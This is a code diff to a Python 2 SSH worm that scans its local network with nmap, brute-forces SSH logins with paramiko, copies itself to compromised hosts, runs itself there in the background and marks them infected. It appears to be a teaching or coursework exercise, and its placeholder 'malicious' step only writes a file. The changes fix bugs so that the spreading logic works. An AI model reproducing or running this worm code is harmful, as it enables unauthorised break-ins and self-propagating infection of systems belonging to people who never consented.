@@ -8,6 +8,7 @@ import sys          # System
 import socket       # Handle socket connection
 import nmap         # Handle NMAP/port scanning
 import os           # Operating system command
+import netifaces    # Handle network interfaces
 from subprocess import call
 
 #===============================================================================
@@ -93,7 +94,6 @@ def markSystem(inFile):
         fileObj = open(inFile, "w")
         fileObj.write("")
         fileObj.close()
-        print "System marked"
     except IOError as e:
         print "Error in markSystem function and file " + inFile
         print "Unable to mark it"
@@ -105,6 +105,7 @@ def markSystem(inFile):
 #===============================================================================
 def markSystemAsInfected():
     markSystem(INFECTED_MARKER_FILE)
+    print "System marked as infected"
 
 #===============================================================================
 # Function to mark the system as attacker/master
@@ -112,6 +113,7 @@ def markSystemAsInfected():
 #===============================================================================
 def markSystemAsMaster():
     markSystem(SELF_MARKER_FILE)
+    print "System marked as master"
 
 #===============================================================================
 # Function to convert IPV4 Netmask to CIDR (Classless Interdomain Routing)
@@ -209,9 +211,9 @@ def getHostsOnTheSameNetwork(CIDR):
 def tryCredentials(host, userName, userPass, sshClient):
 
     try:
-        sshClient.open(host, username=userName, password=userPass)
+        sshClient.connect(host, username=userName, password=userPass)
         return 0
-    except socket.socket_error:
+    except socket.error:
         return 3
     except paramiko.AuthenticationException:
         return 1
@@ -281,8 +283,10 @@ def spreadAndExecute(sshClient, fromHost):
         # Tell the remote system to execute it
         cmdString = "nohup python " + WORM_DEST + " " + fromHost + " >/tmp/nohup.out 2>&1 &"
         sshClient.exec_command(cmdString)
+        sshClient.close()
 
-    except (IOError, socket.socket_error) as msg:
+    except (IOError) as msg:
+        print "spreadAndExecute function:"
         print "Error encountered while trying to spread"
         print msg
 
@@ -292,7 +296,13 @@ def spreadAndExecute(sshClient, fromHost):
 #===============================================================================
 def performMalicious(fromHost):
     #TODO: Write code here to perform what ever the malicious action is
-    call(["echo ", fromHost, ">", "/tmp/.attackFrom.txt"])
+    try:
+        outFile = open("/tmp/.attackedFrom.txt", "w")
+        outFile.write("System was attacked from " + fromHost)
+        outFile.close()
+    except IOError as msg:
+        print "performMalicious function:"
+        print msg
 
 #===============================================================================
 # Main program start here
@@ -300,7 +310,7 @@ def performMalicious(fromHost):
 if __name__ == "__main__":
 
     # If the program run without an argument.  Then it's on a master
-    if len(sys.argv) > 2:
+    if len(sys.argv) > 1:
         print "We are on the victim system"
 
         # If the system already infected, we exit
@@ -308,14 +318,16 @@ if __name__ == "__main__":
             sys.exit(0)
         else:
             # Otherwise we perform some malicious action
-            performMalicious(sys.argv[2])
+            fromHost = sys.argv[1]
+            performMalicious(fromHost)
 
             # Then mark the system as infected
             markSystemAsInfected()
     else:
         # If we are running with another argument, then first
         # mark the system as master
-        markSystemAsMaster()
+        if not isLocalSystemInfected():
+            markSystemAsMaster()
 
 
     # Perform scanning/attack/spread
@@ -340,11 +352,11 @@ if __name__ == "__main__":
 
     # Go through the network hosts
     for host in networkHosts:
-
+        print "\n"
+        print "Attacking host: " + host
         # Try to attack this host return a tuple
         sshInfo =  attackSystem(host)
-        print sshInfo
-
+        #print sshInfo
 
         # Did the attack succeed?
         if sshInfo:
@@ -362,4 +374,5 @@ if __name__ == "__main__":
                 break
 
     # If we get here, terminate the program
+    print "Done"
     sys.exit(0)
